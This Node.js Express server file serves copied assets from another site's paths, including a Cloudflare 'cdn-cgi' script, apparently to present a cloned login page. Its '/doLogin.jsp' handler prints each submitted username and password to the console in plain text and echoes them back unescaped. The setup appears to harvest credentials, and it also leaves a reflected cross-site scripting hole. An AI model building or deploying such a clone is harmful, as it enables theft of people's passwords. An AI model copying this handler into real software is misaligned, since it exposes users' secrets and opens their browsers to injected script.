const express = require('express');
const app = express();
const bodyParser = require('body-parser')
const jspEngine = require('node-jsp')
const path = require('path')
let fs = require('fs');
let imagen
let htmlFile
let bootstrapt
let makumba
let bootstrap
let rocket
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());
fs.readFile('./images/BEST_signature.svg', function (err, data) {
  if (err) {
    throw err;
  }
  imagen = data;
})
fs.readFile('./cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js', function (err, data) {
  if (err) {
    throw err;
  }
  rocket = data;
})
fs.readFile('./algo.html', function (err, data) {
  if (err) {
    throw err;
  }
  htmlFile = data;
});
fs.readFile('./mak-tools/makumbaResources/css/makumba.css', function (err, data) {
  if (err) {
    throw err;
  }
  makumba = data;
});
fs.readFile('./layout/dist/css/bootstrap-theme.css', function (err, data) {
  if (err) {
    throw err;
  }
  bootstrapt = data;
});
fs.readFile('./layout/dist/css/bootstrap.css', function (err, data) {
  if (err) {
    throw err;
  }
  bootstrap = data;
});

app.get('/', (req, res) => {
  res.writeHead(200, { "Content-Type": "text/html" });
  res.write(htmlFile);
  res.end()

}
)
app.get('/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js', (req, res) => {
  res.writeHead(200, { "Content-Type": "application/javascript" });
  res.write(rocket);
  res.end()

})
app.get('/images/BEST_signature.svg', (req, res) => {
  res.writeHead(200, { "Content-Type": "image/svg+xml" });
  res.write(imagen);
  res.end()

})
app.get('/mak-tools/makumbaResources/css/makumba.css', (req, res) => {
  res.writeHead(200, { "Content-Type": "text/css" });
  res.write(makumba);
  res.end()

})
app.get('/layout/dist/css/bootstrap.css', (req, res) => {
  res.writeHead(200, { "Content-Type": "text/css" });
  res.write(bootstrap);
  res.end()

})
app.get('/layout/dist/css/bootstrap-theme.css', (req, res) => {
  res.writeHead(200, { "Content-Type": "text/css" });
  res.write(bootstrapt);
  res.end()

})
// handle login form submission
app.post('/doLogin.jsp', (req, res) => {
  const { username, password } = req.body;
  console.log(`Username: ${username}, Password: ${password}`);
  res.send(`Username: ${username}, Password: ${password}`)
  // add your authentication logic here
});
module.exports = app
